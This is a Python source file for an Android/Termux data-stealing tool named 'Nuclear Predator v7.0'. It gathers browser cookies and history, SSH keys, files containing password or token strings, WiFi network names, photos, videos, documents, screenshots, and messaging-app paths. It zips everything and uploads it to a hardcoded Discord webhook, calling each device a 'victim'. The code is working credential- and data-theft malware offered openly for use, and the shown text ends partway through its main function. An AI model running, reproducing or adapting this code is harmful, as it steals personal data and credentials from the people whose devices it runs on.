#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX NUCLEAR PREDATOR v7.0                  ║
# ║        ULTIMATE DATA HARVESTER - EVERYTHING             ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ WEBHOOK - PUT YOUR WORKING WEBHOOK HERE ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
import sqlite3
import zipfile
import io
import shutil
import hashlib
from datetime import datetime
from pathlib import Path
import mimetypes

# ════════ CONFIGURATION ════════
ssl._create_default_https_context = ssl._create_unverified_context
VICTIM_ID = hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12]

# ════════ ANDROID BROWSER PATHS ════════
ANDROID_BROWSER_PATHS = {
    'chrome': [
        '/data/data/com.android.chrome/app_chrome/Default',
        '/data/data/com.android.chrome/files',
        '/data/data/com.chrome.beta/app_chrome/Default'
    ],
    'firefox': [
        '/data/data/org.mozilla.firefox/files/mozilla',
        '/data/data/org.mozilla.firefox'
    ],
    'opera': [
        '/data/data/com.opera.browser/app_opera'
    ],
    'samsung': [
        '/data/data/com.sec.android.app.sbrowser'
    ],
    'uc': [
        '/data/data/com.UCMobile/files/UCBrowser'
    ]
}

# ════════ FILE TYPES TO HARVEST ════════
TARGET_EXTENSIONS = {
    'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'],
    'videos': ['.mp4', '.avi', '.mov', '.mkv', '.flv', '.wmv'],
    'documents': ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt'],
    'databases': ['.db', '.sqlite', '.sqlite3', '.mdb'],
    'configs': ['.conf', '.config', '.cfg', '.ini', '.json', '.xml', '.yml', '.yaml'],
    'archives': ['.zip', '.rar', '.7z', '.tar', '.gz'],
    'logs': ['.log', '.txt']
}

# ════════ ULTIMATE FILE HARVESTER ════════
class NuclearHarvester:
    def __init__(self):
        self.harvested_files = []
        self.total_size = 0
        self.webhook = WEBHOOK_URL
        
    def harvest_everything(self):
        """Harvest EVERYTHING from the device"""
        print("\n" + "💀"*70)
        print("💀 NUCLEAR HARVEST INITIATED - COLLECTING EVERYTHING")
        print("💀"*70)
        
        all_data = {
            "victim_id": VICTIM_ID,
            "timestamp": datetime.now().isoformat(),
            "operator": "M1 EZ HAING NOW PH",
            "system_info": self.get_system_intel(),
            "browser_data": self.harvest_browser_data(),
            "media_files": self.harvest_media_files(),
            "documents": self.harvest_documents(),
            "passwords": self.harvest_passwords(),
            "cookies": self.harvest_cookies(),
            "search_history": self.harvest_search_history(),
            "whatsapp_data": self.harvest_whatsapp_data(),
            "telegram_data": self.harvest_telegram_data(),
            "sensitive_files": self.find_sensitive_files(),
            "network_data": self.get_network_intel(),
            "storage_analysis": self.analyze_storage(),
            "installed_apps": self.get_installed_apps(),
            "screenshot_data": self.harvest_screenshots()
        }
        
        # Create ZIP with everything
        zip_buffer = self.create_mega_zip(all_data)
        
        # Send to Discord
        self.send_nuclear_payload(all_data, zip_buffer)
        
        return all_data
    
    def get_system_intel(self):
        """Get complete system intelligence"""
        print("\n[1] 🖥️  COLLECTING SYSTEM INTELLIGENCE...")
        
        intel = {
            "device_id": VICTIM_ID,
            "collection_time": datetime.now().isoformat(),
            "basic_info": {
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": platform.python_version()
            },
            "android_info": self.get_android_info(),
            "storage_info": self.get_storage_info(),
            "network_info": self.get_network_info(),
            "process_info": self.get_process_info(),
            "installed_packages": self.get_installed_packages(),
            "hacking_tools": self.detect_hacking_tools(),
            "termux_info": self.get_termux_info()
        }
        
        print(f"    ✅ System Intel: {len(json.dumps(intel)):,} bytes")
        return intel
    
    def get_android_info(self):
        """Get Android-specific information"""
        info = {}
        
        # Check Android version
        android_version = "Unknown"
        try:
            if os.path.exists('/system/build.prop'):
                with open('/system/build.prop', 'r') as f:
                    content = f.read()
                    for line in content.split('\n'):
                        if 'ro.build.version.release' in line:
                            android_version = line.split('=')[1].strip()
                            break
        except:
            pass
        
        info['android_version'] = android_version
        info['is_rooted'] = os.path.exists('/system/xbin/su') or os.path.exists('/system/bin/su')
        info['has_termux'] = os.path.exists('/data/data/com.termux')
        info['sdcard_access'] = os.path.exists('/sdcard')
        
        # Get device model
        try:
            if os.path.exists('/system/build.prop'):
                with open('/system/build.prop', 'r') as f:
                    content = f.read()
                    for line in content.split('\n'):
                        if 'ro.product.model' in line:
                            info['device_model'] = line.split('=')[1].strip()
                            break
                        elif 'ro.product.manufacturer' in line:
                            info['manufacturer'] = line.split('=')[1].strip()
        except:
            pass
        
        return info
    
    def get_storage_info(self):
        """Get detailed storage information"""
        storage = {}
        
        # Android storage paths
        storage_paths = [
            ('/', 'Root'),
            ('/sdcard', 'External Storage'),
            ('/storage/emulated/0', 'Internal Storage'),
            ('/data/data/com.termux/files/home', 'Termux Home'),
            ('/system', 'System'),
            ('/data', 'Data Partition')
        ]
        
        for path, name in storage_paths:
            if os.path.exists(path):
                try:
                    usage = shutil.disk_usage(path)
                    storage[name] = {
                        'path': path,
                        'total_gb': usage.total // (1024**3),
                        'used_gb': usage.used // (1024**3),
                        'free_gb': usage.free // (1024**3),
                        'free_percent': (usage.free / usage.total * 100) if usage.total > 0 else 0
                    }
                except:
                    storage[name] = {'path': path, 'status': 'access_denied'}
        
        return storage
    
    def get_network_info(self):
        """Get comprehensive network information"""
        network = {}
        
        # Public IP
        try:
            network['public_ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        except:
            network['public_ip'] = "Unknown"
        
        # Network interfaces
        try:
            result = subprocess.run("ip addr show", shell=True, capture_output=True, text=True, timeout=5)
            if result.stdout:
                network['interfaces'] = result.stdout.strip().split('\n')[:30]
        except:
            pass
        
        # WiFi info
        try:
            wifi_files = [
                '/data/misc/wifi/wpa_supplicant.conf',
                '/data/misc/wifi/WifiConfigStore.xml'
            ]
            
            wifi_networks = []
            for wifi_file in wifi_files:
                if os.path.exists(wifi_file):
                    try:
                        with open(wifi_file, 'r', errors='ignore') as f:
                            content = f.read()
                            # Extract SSIDs
                            import re
                            ssids = re.findall(r'ssid="([^"]+)"', content)
                            wifi_networks.extend(ssids)
                    except:
                        pass
            
            network['wifi_networks'] = list(set(wifi_networks))[:20]
        except:
            pass
        
        return network
    
    def harvest_browser_data(self):
        """Harvest ALL browser data"""
        print("\n[2] 🌐 HARVESTING BROWSER DATA...")
        
        browser_data = {}
        
        for browser, paths in ANDROID_BROWSER_PATHS.items():
            browser_data[browser] = {
                'found': False,
                'cookies': [],
                'passwords': [],
                'history': [],
                'bookmarks': [],
                'downloads': [],
                'cache': []
            }
            
            for path in paths:
                if os.path.exists(path):
                    browser_data[browser]['found'] = True
                    browser_data[browser]['path'] = path
                    
                    # Look for databases
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.db', '.sqlite')):
                                    db_path = os.path.join(root, file)
                                    
                                    # Check what type of database
                                    db_name = file.lower()
                                    if 'cookies' in db_name:
                                        browser_data[browser]['cookies'].append(db_path)
                                    elif 'web data' in db_name or 'password' in db_name:
                                        browser_data[browser]['passwords'].append(db_path)
                                    elif 'history' in db_name:
                                        browser_data[browser]['history'].append(db_path)
                                    elif 'bookmark' in db_name:
                                        browser_data[browser]['bookmarks'].append(db_path)
                                    elif 'download' in db_name:
                                        browser_data[browser]['downloads'].append(db_path)
                    except:
                        pass
        
        # Try to extract actual data from databases
        for browser in browser_data:
            if browser_data[browser]['found']:
                self.extract_browser_info(browser_data[browser])
        
        print(f"    ✅ Browser Data Harvested")
        return browser_data
    
    def extract_browser_info(self, browser_info):
        """Extract actual data from browser databases"""
        try:
            # Extract from cookies database
            for cookie_db in browser_info['cookies'][:3]:  # Limit to 3 dbs
                try:
                    conn = sqlite3.connect(cookie_db)
                    cursor = conn.cursor()
                    
                    # Get cookies
                    cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
                    cookies = cursor.fetchall()
                    browser_info['cookies_data'] = [{'host': c[0], 'name': c[1], 'value': c[2][:50]} for c in cookies[:20]]
                    
                    conn.close()
                except:
                    pass
            
            # Extract from history database
            for history_db in browser_info['history'][:2]:
                try:
                    conn = sqlite3.connect(history_db)
                    cursor = conn.cursor()
                    
                    # Get last 50 searches
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    history = cursor.fetchall()
                    browser_info['history_data'] = [{'url': h[0], 'title': h[1]} for h in history[:20]]
                    
                    conn.close()
                except:
                    pass
                    
        except Exception as e:
            browser_info['extraction_error'] = str(e)
    
    def harvest_media_files(self):
        """Harvest photos and videos"""
        print("\n[3] 📸 HARVESTING MEDIA FILES...")
        
        media = {
            'photos': [],
            'videos': [],
            'screenshots': [],
            'camera_photos': []
        }
        
        # Common media directories on Android
        media_dirs = [
            '/sdcard/DCIM/Camera',
            '/sdcard/DCIM/Screenshots',
            '/sdcard/Pictures',
            '/sdcard/Download',
            '/sdcard/Movies',
            '/storage/emulated/0/DCIM/Camera',
            '/storage/emulated/0/Pictures',
            '/sdcard/WhatsApp/Media',
            '/sdcard/Telegram/Telegram Images',
            '/sdcard/Instagram'
        ]
        
        photo_count = 0
        video_count = 0
        
        for media_dir in media_dirs:
            if os.path.exists(media_dir):
                try:
                    for root, dirs, files in os.walk(media_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            file_lower = file.lower()
                            
                            # Check file type
                            if any(file_lower.endswith(ext) for ext in TARGET_EXTENSIONS['images']):
                                if photo_count < 100:  # Limit to 100 photos
                                    try:
                                        size = os.path.getsize(file_path)
                                        if size < 10 * 1024 * 1024:  # 10MB limit
                                            media['photos'].append({
                                                'path': file_path,
                                                'name': file,
                                                'size_mb': size // (1024 * 1024),
                                                'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                                            })
                                            photo_count += 1
                                            self.harvested_files.append(file_path)
                                            self.total_size += size
                                    except:
                                        pass
                            
                            elif any(file_lower.endswith(ext) for ext in TARGET_EXTENSIONS['videos']):
                                if video_count < 50:  # Limit to 50 videos
                                    try:
                                        size = os.path.getsize(file_path)
                                        if size < 20 * 1024 * 1024:  # 20MB limit
                                            media['videos'].append({
                                                'path': file_path,
                                                'name': file,
                                                'size_mb': size // (1024 * 1024),
                                                'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                                            })
                                            video_count += 1
                                            self.harvested_files.append(file_path)
                                            self.total_size += size
                                    except:
                                        pass
                                    
                        if photo_count >= 100 and video_count >= 50:
                            break
                except:
                    pass
        
        media['photo_count'] = photo_count
        media['video_count'] = video_count
        
        print(f"    ✅ Media: {photo_count} photos, {video_count} videos")
        return media
    
    def harvest_documents(self):
        """Harvest documents"""
        print("\n[4] 📄 HARVESTING DOCUMENTS...")
        
        documents = []
        doc_dirs = [
            '/sdcard/Download',
            '/sdcard/Documents',
            '/sdcard/WhatsApp/Media/WhatsApp Documents',
            '/storage/emulated/0/Download'
        ]
        
        doc_count = 0
        
        for doc_dir in doc_dirs:
            if os.path.exists(doc_dir):
                try:
                    for root, dirs, files in os.walk(doc_dir):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS['documents']):
                                if doc_count < 50:  # Limit to 50 documents
                                    file_path = os.path.join(root, file)
                                    try:
                                        size = os.path.getsize(file_path)
                                        if size < 5 * 1024 * 1024:  # 5MB limit
                                            documents.append({
                                                'path': file_path,
                                                'name': file,
                                                'size_mb': size // (1024 * 1024),
                                                'type': file.split('.')[-1].upper()
                                            })
                                            doc_count += 1
                                            self.harvested_files.append(file_path)
                                            self.total_size += size
                                    except:
                                        pass
                except:
                    pass
        
        print(f"    ✅ Documents: {doc_count} files")
        return documents
    
    def harvest_passwords(self):
        """Harvest password files"""
        print("\n[5] 🔐 HARVESTING PASSWORD FILES...")
        
        passwords = {
            'ssh_keys': [],
            'password_files': [],
            'config_files': [],
            'database_files': []
        }
        
        # Find SSH keys
        try:
            result = subprocess.run(
                "find /sdcard /data -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -10",
                shell=True, capture_output=True, text=True
            )
            if result.stdout:
                passwords['ssh_keys'] = [line.strip() for line in result.stdout.strip().split('\n') if line]
        except:
            pass
        
        # Find password files
        search_terms = ['password', 'passwd', 'secret', 'key', 'token', 'credential', 'login']
        for term in search_terms:
            try:
                cmd = f"grep -r -i '{term}' /sdcard/Download /sdcard/Documents 2>/dev/null | head -5"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    passwords['password_files'].extend(lines[:3])
            except:
                pass
        
        print(f"    ✅ Password Files: {len(passwords['ssh_keys'])} SSH keys")
        return passwords
    
    def harvest_cookies(self):
        """Harvest cookies from browsers"""
        print("\n[6] 🍪 HARVESTING COOKIES...")
        
        cookies = []
        
        # Look for cookie databases
        cookie_patterns = ['Cookies', 'cookies.db', 'webviewCookies']
        
        for pattern in cookie_patterns:
            try:
                cmd = f"find /data -name '*{pattern}*' 2>/dev/null | head -5"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    db_files = [line.strip() for line in result.stdout.strip().split('\n') if line]
                    
                    for db_file in db_files[:3]:  # Check first 3 databases
                        try:
                            conn = sqlite3.connect(db_file)
                            cursor = conn.cursor()
                            
                            # Try to get cookies
                            try:
                                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 20")
                                cookie_data = cursor.fetchall()
                                
                                for cookie in cookie_data:
                                    cookies.append({
                                        'domain': cookie[0],
                                        'name': cookie[1],
                                        'value': cookie[2][:100] if cookie[2] else ''
                                    })
                            except:
                                pass
                            
                            conn.close()
                        except:
                            pass
            except:
                pass
        
        print(f"    ✅ Cookies: {len(cookies)} found")
        return cookies[:50]  # Limit to 50 cookies
    
    def harvest_search_history(self):
        """Harvest search history"""
        print("\n[7] 🔍 HARVESTING SEARCH HISTORY...")
        
        search_history = []
        
        # Browser history databases
        history_patterns = ['History', 'browser.db', 'webview.db']
        
        for pattern in history_patterns:
            try:
                cmd = f"find /data -name '*{pattern}*' 2>/dev/null | head -3"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    db_files = [line.strip() for line in result.stdout.strip().split('\n') if line]
                    
                    for db_file in db_files:
                        try:
                            conn = sqlite3.connect(db_file)
                            cursor = conn.cursor()
                            
                            # Try different table names
                            tables = ['urls', 'history', 'searches', 'search_history']
                            
                            for table in tables:
                                try:
                                    cursor.execute(f"SELECT url, title, last_visit_time FROM {table} ORDER BY last_visit_time DESC LIMIT 50")
                                    history = cursor.fetchall()
                                    
                                    for entry in history:
                                        if 'google.com/search' in entry[0] or 'search' in entry[0].lower():
                                            search_history.append({
                                                'query': entry[1] if entry[1] else entry[0],
                                                'url': entry[0],
                                                'timestamp': entry[2] if len(entry) > 2 else 'N/A'
                                            })
                                            
                                            if len(search_history) >= 50:
                                                break
                                except:
                                    pass
                                
                            conn.close()
                        except:
                            pass
            except:
                pass
        
        print(f"    ✅ Search History: {len(search_history)} entries")
        return search_history[:50]
    
    def harvest_whatsapp_data(self):
        """Harvest WhatsApp data"""
        print("\n[8] 💚 HARVESTING WHATSAPP DATA...")
        
        whatsapp = {
            'found': False,
            'databases': [],
            'media': [],
            'backups': []
        }
        
        whatsapp_paths = [
            '/sdcard/WhatsApp',
            '/storage/emulated/0/WhatsApp',
            '/data/data/com.whatsapp'
        ]
        
        for path in whatsapp_paths:
            if os.path.exists(path):
                whatsapp['found'] = True
                whatsapp['path'] = path
                
                # Find databases
                try:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.db'):
                                whatsapp['databases'].append(os.path.join(root, file))
                        break
                except:
                    pass
        
        print(f"    ✅ WhatsApp: {'Found' if whatsapp['found'] else 'Not found'}")
        return whatsapp
    
    def harvest_telegram_data(self):
        """Harvest Telegram data"""
        print("\n[9] 💙 HARVESTING TELEGRAM DATA...")
        
        telegram = {
            'found': False,
            'databases': [],
            'cache': []
        }
        
        telegram_paths = [
            '/sdcard/Telegram',
            '/storage/emulated/0/Telegram',
            '/data/data/org.telegram.messenger'
        ]
        
        for path in telegram_paths:
            if os.path.exists(path):
                telegram['found'] = True
                telegram['path'] = path
                
                # Find cache and data
                try:
                    cache_path = os.path.join(path, 'Telegram Images')
                    if os.path.exists(cache_path):
                        telegram['cache'].append(cache_path)
                except:
                    pass
        
        print(f"    ✅ Telegram: {'Found' if telegram['found'] else 'Not found'}")
        return telegram
    
    def find_sensitive_files(self):
        """Find sensitive files"""
        print("\n[10] 🔓 FINDING SENSITIVE FILES...")
        
        sensitive = {
            'database_files': [],
            'config_files': [],
            'backup_files': [],
            'log_files': []
        }
        
        # Search in common locations
        search_locations = ['/sdcard', '/storage/emulated/0', '/data/data/com.termux/files/home']
        
        for location in search_locations:
            if os.path.exists(location):
                # Database files
                try:
                    cmd = f"find {location} -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -10"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.stdout:
                        sensitive['database_files'].extend([line.strip() for line in result.stdout.strip().split('\n') if line])
                except:
                    pass
                
                # Config files
                for ext in TARGET_EXTENSIONS['configs']:
                    try:
                        cmd = f"find {location} -name '*{ext}' 2>/dev/null | head -5"
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                        if result.stdout:
                            sensitive['config_files'].extend([line.strip() for line in result.stdout.strip().split('\n') if line])
                    except:
                        pass
        
        print(f"    ✅ Sensitive Files: {len(sensitive['database_files'])} databases")
        return sensitive
    
    def get_process_info(self):
        """Get running process information"""
        try:
            result = subprocess.run("ps aux", shell=True, capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.strip().split('\n')[:20]
                return processes
        except:
            pass
        return []
    
    def get_installed_packages(self):
        """Get installed packages"""
        packages = []
        try:
            result = subprocess.run("apt list --installed 2>/dev/null | head -50", 
                                  shell=True, capture_output=True, text=True)
            if result.stdout:
                packages = result.stdout.strip().split('\n')[1:40]
        except:
            pass
        return packages
    
    def detect_hacking_tools(self):
        """Detect hacking tools"""
        tools = []
        hacking_tools = [
            'nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
            'john', 'hashcat', 'wireshark', 'adb', 'python3',
            'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump',
            'binwalk', 'steghide', 'strings', 'radare2'
        ]
        
        for tool in hacking_tools:
            try:
                result = subprocess.run(f"which {tool} 2>/dev/null", 
                                      shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    tools.append(tool)
            except:
                pass
        
        return tools
    
    def get_termux_info(self):
        """Get Termux information"""
        info = {}
        
        if os.path.exists('/data/data/com.termux'):
            info['installed'] = True
            info['home_dir'] = os.path.expanduser('~')
            
            # Get $PREFIX
            info['prefix'] = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
        else:
            info['installed'] = False
        
        return info
    
    def harvest_screenshots(self):
        """Harvest screenshots"""
        print("\n[11] 📱 HARVESTING SCREENSHOTS...")
        
        screenshots = []
        screenshot_dirs = [
            '/sdcard/DCIM/Screenshots',
            '/sdcard/Pictures/Screenshots',
            '/storage/emulated/0/DCIM/Screenshots'
        ]
        
        for ss_dir in screenshot_dirs:
            if os.path.exists(ss_dir):
                try:
                    files = os.listdir(ss_dir)[:10]  # First 10 files
                    for file in files:
                        if 'screenshot' in file.lower() or file.lower().endswith(('.png', '.jpg')):
                            file_path = os.path.join(ss_dir, file)
                            try:
                                size = os.path.getsize(file_path)
                                if size < 5 * 1024 * 1024:  # 5MB limit
                                    screenshots.append({
                                        'path': file_path,
                                        'name': file,
                                        'size_mb': size // (1024 * 1024)
                                    })
                                    self.harvested_files.append(file_path)
                                    self.total_size += size
                            except:
                                pass
                except:
                    pass
        
        print(f"    ✅ Screenshots: {len(screenshots)} found")
        return screenshots
    
    def analyze_storage(self):
        """Analyze storage for large files"""
        print("\n[12] 💾 ANALYZING STORAGE...")
        
        analysis = {
            'large_files': [],
            'recent_files': [],
            'hidden_files': []
        }
        
        # Find large files (>50MB)
        try:
            cmd = "find /sdcard -type f -size +50M 2>/dev/null | head -10"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.stdout:
                files = result.stdout.strip().split('\n')
                for file in files:
                    if file:
                        try:
                            size = os.path.getsize(file) // (1024 * 1024)
                            analysis['large_files'].append({'path': file, 'size_mb': size})
                        except:
                            pass
        except:
            pass
        
        # Find recent files (last 24 hours)
        try:
            cmd = "find /sdcard -type f -mtime -1 2>/dev/null | head -10"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.stdout:
                files = result.stdout.strip().split('\n')
                for file in files:
                    if file:
                        analysis['recent_files'].append(file)
        except:
            pass
        
        print(f"    ✅ Storage Analysis Complete")
        return analysis
    
    def get_installed_apps(self):
        """Get installed Android apps"""
        print("\n[13] 📱 GETTING INSTALLED APPS...")
        
        apps = []
        
        # Try to get app list
        try:
            # For rooted devices
            if os.path.exists('/system/bin/pm'):
                result = subprocess.run("pm list packages", shell=True, capture_output=True, text=True)
                if result.stdout:
                    packages = result.stdout.strip().split('\n')
                    apps = [pkg.replace('package:', '') for pkg in packages[:30]]
            else:
                # Check common app directories
                app_dirs = [
                    '/data/app',
                    '/system/app',
                    '/system/priv-app'
                ]
                
                for app_dir in app_dirs:
                    if os.path.exists(app_dir):
                        try:
                            dirs = os.listdir(app_dir)[:20]
                            apps.extend(dirs)
                        except:
                            pass
        except:
            pass
        
        print(f"    ✅ Apps: {len(apps)} found")
        return apps
    
    def create_mega_zip(self, all_data):
        """Create ZIP file with harvested data"""
        print("\n[14] 📦 CREATING MEGA ZIP ARCHIVE...")
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add JSON data
            json_data = json.dumps(all_data, indent=2, ensure_ascii=False)
            zip_file.writestr('nuclear_report.json', json_data)
            
            # Add text summary
            summary = self.create_text_summary(all_data)
            zip_file.writestr('summary.txt', summary)
            
            # Add harvested files (limited to avoid memory issues)
            added_files = 0
            for file_path in self.harvested_files[:20]:  # Limit to 20 files
                try:
                    if os.path.exists(file_path) and os.path.getsize(file_path) < 2 * 1024 * 1024:  # 2MB limit
                        with open(file_path, 'rb') as f:
                            zip_file.writestr(f'harvested/{os.path.basename(file_path)}', f.read())
                            added_files += 1
                except:
                    pass
            
            # Add system info file
            system_info = f"NUCLEAR HARVEST REPORT\nVictim ID: {VICTIM_ID}\n"
            system_info += f"Time: {datetime.now().isoformat()}\n"
            system_info += f"Total Files Harvested: {len(self.harvested_files)}\n"
            system_info += f"Total Size: {self.total_size // (1024*1024)} MB\n"
            zip_file.writestr('system_info.txt', system_info)
        
        print(f"    ✅ ZIP Created: {added_files} files added")
        return zip_buffer.getvalue()
    
    def create_text_summary(self, data):
        """Create text summary of harvested data"""
        summary = []
        summary.append("╔══════════════════════════════════════════════════════════╗")
        summary.append("║                NUCLEAR HARVEST SUMMARY                   ║")
        summary.append("╚══════════════════════════════════════════════════════════╝")
        summary.append("")
        summary.append(f"Victim ID: {VICTIM_ID}")
        summary.append(f"Collection Time: {datetime.now().isoformat()}")
        summary.append(f"Device: {data['system_info']['basic_info']['hostname']}")
        summary.append(f"User: {data['system_info']['basic_info']['username']}")
        summary.append(f"Public IP: {data['system_info']['network_info'].get('public_ip', 'Unknown')}")
        summary.append("")
        summary.append("📊 HARVEST STATISTICS:")
        summary.append(f"  • Photos: {len(data['media_files']['photos'])}")
        summary.append(f"  • Videos: {len(data['media_files']['videos'])}")
        summary.append(f"  • Documents: {len(data['documents'])}")
        summary.append(f"  • Screenshots: {len(data['screenshot_data'])}")
        summary.append(f"  • Cookies: {len(data['cookies'])}")
        summary.append(f"  • Search History: {len(data['search_history'])}")
        summary.append(f"  • Hacking Tools: {len(data['system_info']['hacking_tools'])}")
        summary.append(f"  • Installed Packages: {len(data['system_info']['installed_packages'])}")
        summary.append(f"  • Browser Data Found: {sum(1 for b in data['browser_data'].values() if b['found'])}")
        summary.append("")
        summary.append("🔥 OPERATION: SUCCESSFUL")
        summary.append("💀 M1 EZ HAING NOW PH - NUCLEAR PREDATOR v7.0")
        
        return "\n".join(summary)
    
    def send_nuclear_payload(self, data, zip_data):
        """Send everything to Discord"""
        print("\n[15] 🚀 SENDING NUCLEAR PAYLOAD TO DISCORD...")
        
        # First, send summary message
        summary = self.create_text_summary(data)
        
        # Split summary if too long
        if len(summary) > 2000:
            parts = [summary[i:i+1900] for i in range(0, len(summary), 1900)]
            for i, part in enumerate(parts, 1):
                self.send_discord_message(f"```\n{part}\n``` Part {i}/{len(parts)}", "Nuclear Harvest Summary")
        else:
            self.send_discord_message(f"```\n{summary}\n```", "Nuclear Harvest Summary")
        
        time.sleep(1)
        
        # Send detailed sections
        self.send_detailed_reports(data)
        
        time.sleep(1)
        
        # Send ZIP file
        self.send_zip_file(zip_data)
        
        time.sleep(1)
        
        # Send final confirmation
        final_msg = f"""✅ NUCLEAR HARVEST COMPLETE
Victim ID: {VICTIM_ID}
Total Files: {len(self.harvested_files)}
Total Size: {self.total_size // (1024*1024)} MB
Time: {datetime.now().strftime("%H:%M:%S")}
Status: ALL DATA EXFILTRATED
🔥 M1 EZ HAING NOW PH - SYSTEM OWNED"""
        
        self.send_discord_message(final_msg, "Mission Complete")
        
        print("\n" + "💀"*70)
        print("💀 NUCLEAR HARVEST COMPLETE - ALL DATA SENT")
        print("💀"*70)
    
    def send_detailed_reports(self, data):
        """Send detailed reports"""
        # Send system info
        sys_info = f"""🖥️ SYSTEM INTELLIGENCE
Device: {data['system_info']['basic_info']['hostname']}
User: {data['system_info']['basic_info']['username']}
Android: {data['system_info']['android_info'].get('android_version', 'Unknown')}
IP: {data['system_info']['network_info'].get('public_ip', 'Unknown')}
Hacking Tools: {', '.join(data['system_info']['hacking_tools'])}"""
        
        self.send_discord_message(sys_info, "System Intel")
        
        # Send media info
        media_info = f"""📸 MEDIA HARVEST
Photos: {len(data['media_files']['photos'])}
Videos: {len(data['media_files']['videos'])}
Screenshots: {len(data['screenshot_data'])}
Documents: {len(data['documents'])}"""
        
        self.send_discord_message(media_info, "Media Report")
        
        # Send browser info
        browsers_found = [browser for browser, info in data['browser_data'].items() if info['found']]
        browser_info = f"""🌐 BROWSER DATA
Browsers Found: {', '.join(browsers_found) if browsers_found else 'None'}
Cookies: {len(data['cookies'])}
Search History: {len(data['search_history'])} entries"""
        
        self.send_discord_message(browser_info, "Browser Report")
    
    def send_discord_message(self, content, username=None):
        """Send message to Discord"""
        try:
            payload = {
                "content": content
            }
            if username:
                payload["username"] = username
            
            data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Nuclear Predator v7.0)'
            }
            
            req = urllib.request.Request(self.webhook, data=data, headers=headers)
            urllib.request.urlopen(req, timeout=15)
            print(f"    ✅ {username} sent")
            return True
        except Exception as e:
            print(f"    ❌ Failed to send {username}: {str(e)[:50]}")
            return False
    
    def send_zip_file(self, zip_data):
        """Send ZIP file to Discord"""
        try:
            # Discord requires multipart form for files
            boundary = '----NuclearBoundary' + hashlib.md5(str(time.time()).encode()).hexdigest()
            
            # Build multipart form
            body = []
            body.append(f'--{boundary}')
            body.append('Content-Disposition: form-data; name="file"; filename="nuclear_harvest.zip"')
            body.append('Content-Type: application/zip')
            body.append('')
            body = '\r\n'.join(body).encode() + zip_data + f'\r\n--{boundary}--\r\n'.encode()
            
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0'
            }
            
            req = urllib.request.Request(self.webhook, data=body, headers=headers)
            response = urllib.request.urlopen(req, timeout=30)
            
            print(f"    ✅ ZIP file sent! Status: {response.status}")
            return True
            
        except Exception as e:
            print(f"    ❌ Failed to send ZIP: {str(e)[:50]}")
            return False

# ════════ MAIN EXECUTION ════════
def main():
    """Main execution"""
    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║                M1 EZ HAING NOW  PH                       ║")
    print("║            TERMUX NUCLEAR PREDATOR v7.0                  ║")
    print("║        ULTIMATE DATA HARVEST - EVERYTHING               ║")
    print("╚══════════════════════════════════════════════════════════╝")
    
    print("\n" + "⚠️"*70)
    print("⚠️  WARNING: This tool harvests ALL data from the device!")
    print("⚠️  Including: Photos, Videos, Documents, Passwords, Cookies")
    print("⚠️  Search History, Browser Data, and EVERYTHING else!")
    print("⚠️"*70)
    
    time.sleep(2)
    
    # Check webhook
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("\n❌ ERROR: Webhook not configured!")
        print("ℹ️  Replace line 7 with your Discord webhook URL")
        return
    
    print("\n" + "🚀"*70)
    print("🚀 STARTING NUCLEAR HARVEST - THIS MAY TAKE 2-3 MINUTES")
    print("🚀"*70)
    
    # Create harvester and run
    harvester = NuclearHarvester()
    
    try:
        start_time = time.time()
        harvested_data = harvester.harvest_everything()
        elapsed_time = time.time() - start_time
        
        # Show final statistics
        print("\n" + "📊"*70)
        print("📊 NUCLEAR HARVEST COMPLETE - FINAL STATISTICS")
